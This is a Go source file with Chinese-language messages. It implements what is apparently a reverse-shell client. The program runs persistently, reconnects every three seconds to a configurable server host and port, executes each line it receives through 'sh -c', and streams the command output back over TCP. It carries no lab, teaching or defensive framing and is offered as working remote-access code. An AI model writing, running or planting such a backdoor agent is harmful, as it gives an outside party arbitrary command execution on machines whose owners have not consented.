package main

import (
    "bufio"
    "flag"
    "fmt"
    "net"
    //"os"
    "os/exec"
    "strings"
    "time"
)

var (
    host string
    port int
    help bool
)

func init() {
    flag.StringVar(&host, "h", "127.0.0.1", "服务端IP地址")
    flag.IntVar(&port, "p", 4000, "服务端端口")
    flag.BoolVar(&help, "help", false, "显示帮助信息")
}

func main() {
    flag.Parse()
    if help {
        fmt.Println("客户端帮助信息:")
        fmt.Println("  -h: 服务端IP地址 (默认: 127.0.0.1)")
        fmt.Println("  -p: 服务端端口 (默认: 4000)")
        fmt.Println("  -help: 显示帮助信息")
        fmt.Println("程序将在后台持续运行，并尝试每3秒重连服务端。")
        return
    }

    go func() {
        for {
            conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
            if err != nil {
                time.Sleep(3 * time.Second)
                continue
            }

            done := make(chan struct{})
            go func() {
                receiveMessages(conn)
                close(done)
            }()

            <-done
        }
    }()

    select {}
}

func receiveMessages(conn net.Conn) {
    reader := bufio.NewReader(conn)
    writer := bufio.NewWriter(conn)

    for {
        message, err := reader.ReadString('\n')
        if err != nil {
            fmt.Printf("接收消息错误: %v\n", err)
            return
        }
        message = strings.TrimSpace(message)
        if message == "exit" {
            fmt.Println("接收到退出命令，退出交互模式但不关闭连接")
            continue
        }
        if message == "PING" {
            fmt.Fprintf(writer, "PONG\n")
            writer.Flush()
            continue
        }
        go executeCommandAndStreamOutput(message, writer)
    }
}

func executeCommandAndStreamOutput(command string, writer *bufio.Writer) {
    cmd := exec.Command("sh", "-c", command)
    stdout, err := cmd.StdoutPipe()
    if err != nil {
        fmt.Fprintf(writer, "创建StdoutPipe失败: %v\n<EOF>\n", err)
        writer.Flush()
        return
    }
    stderr, err := cmd.StderrPipe()
    if err != nil {
        fmt.Fprintf(writer, "创建StderrPipe失败: %v\n<EOF>\n", err)
        writer.Flush()
        return
    }

    if err := cmd.Start(); err != nil {
        fmt.Fprintf(writer, "命令启动失败: %v\n<EOF>\n", err)
        writer.Flush()
        return
    }

    go func() {
        scanner := bufio.NewScanner(stdout)
        for scanner.Scan() {
            line := scanner.Text()
            fmt.Fprintf(writer, "%s\n", line)
            writer.Flush()
        }
    }()

    go func() {
        scanner := bufio.NewScanner(stderr)
        for scanner.Scan() {
            line := scanner.Text()
            fmt.Fprintf(writer, "%s\n", line)
            writer.Flush()
        }
    }()

    cmd.Wait()
    fmt.Fprintf(writer, "<EOF>\n")
    writer.Flush()
}







func executeCommand(command string) string {
    parts := strings.Fields(command)
    if len(parts) == 0 {
        return ""
    }

    cmd := exec.Command(parts[0], parts[1:]...)
    stdout, err := cmd.StdoutPipe()
    if err != nil {
        return fmt.Sprintf("创建StdoutPipe失败: %v\n<EOF>", err)
    }
    stderr, err := cmd.StderrPipe()
    if err != nil {
        return fmt.Sprintf("创建StderrPipe失败: %v\n<EOF>", err)
    }

    if err := cmd.Start(); err != nil {
        return fmt.Sprintf("命令启动失败: %v\n<EOF>", err)
    }

    reader := bufio.NewReader(stdout)
    readerErr := bufio.NewReader(stderr)
    var response strings.Builder

    go func() {
        for {
            line, err := reader.ReadString('\n')
            if err != nil {
                break
            }
            response.WriteString(line)
            fmt.Println(line) // 流式输出到服务端
        }
    }()

    go func() {
        for {
            line, err := readerErr.ReadString('\n')
            if err != nil {
                break
            }
            response.WriteString(line)
            fmt.Println(line) // 流式输出到服务端
        }
    }()

    cmd.Wait()
    return fmt.Sprintf("%s<EOF>", response.String())
}


